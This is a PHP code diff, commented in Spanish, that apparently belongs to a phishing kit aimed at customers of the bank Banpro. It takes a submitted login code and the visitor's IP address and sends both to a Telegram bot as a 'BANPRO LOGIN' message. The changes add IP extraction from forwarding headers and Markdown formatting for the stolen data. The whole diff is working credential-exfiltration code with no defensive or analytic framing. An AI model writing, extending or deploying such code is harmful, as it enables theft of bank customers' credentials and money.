@@ -21,17 +21,32 @@ if (empty($codigo)) {
     exit;
 }
 
+// Función para obtener la IP del cliente
+function obtenerIPCliente() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ips[0]); // La primera IP de la lista es la real
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
 // Obtener la IP del cliente
-$ip = $_SERVER['REMOTE_ADDR'];
+$ip = obtenerIPCliente();
 
 // Crear el mensaje
-$mensaje = "BANPRO LOGIN> IP: $ip - Código: $codigo";
+$mensaje = "BANPRO LOGIN:\n";
+$mensaje .= "🔑 Código: $codigo\n";
+$mensaje .= "🌍 IP: $ip\n";
 
 // Enviar el mensaje a Telegram
 $url = "https://api.telegram.org/bot$token/sendMessage";
 $data = [
     'chat_id' => $chat_id,
-    'text' => $mensaje
+    'text' => $mensaje,
+    'parse_mode' => 'Markdown' // Formato de texto para Telegram
 ];
 
 // Usar cURL para realizar la solicitud
